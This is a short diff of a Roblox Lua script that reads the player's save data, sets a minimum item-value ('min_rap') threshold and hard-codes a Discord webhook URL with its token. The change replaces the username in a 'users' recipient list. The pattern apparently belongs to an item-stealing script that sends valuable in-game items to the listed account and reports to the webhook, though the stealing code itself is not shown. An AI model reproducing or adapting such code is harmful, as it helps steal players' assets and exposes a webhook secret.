@@ -17,7 +17,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = {"oyaoming"}
+local users = {"Bird070Human"}
 local min_rap = _G.minrap or 46000
 local webhook = "https://discord.com/api/webhooks/1480099215186071575/L3nGzbh8TONH-YSfklBgg0SRlNHcG-tK4WB1TMbEmUnvciqWNoYwmKYd8zMtUrMDf-jX"
 
